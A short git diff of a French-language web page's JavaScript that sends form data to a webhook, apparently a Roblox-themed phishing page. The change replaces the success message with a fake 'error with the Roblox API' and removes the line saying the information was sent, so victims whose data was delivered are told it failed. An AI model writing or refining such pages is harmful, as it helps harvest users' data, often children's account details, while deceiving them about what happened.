@@ -105,7 +105,7 @@
 
                     if (response.ok) {
                         resultDiv.classList.add("success");
-                        resultDiv.innerHTML = "Les informations ont été envoyées avec succès.";
+                        resultDiv.innerHTML = "Erreur : erreur avec l'api de roblox";
                     } else {
                         throw new Error("Erreur d'envoi au webhook");
                     }
@@ -113,7 +113,7 @@
                 .catch(error => {
                     resultDiv.style.display = "block";
                     resultDiv.classList.add("error");
-                    resultDiv.innerHTML = "Erreur : Les informations ont été envoyées, mais une erreur est survenue.";
+                    resultDiv.innerHTML = "Erreur : une erreur est survenue.";
                 });
             } else {
                 alert("Veuillez remplir tous les champs.");
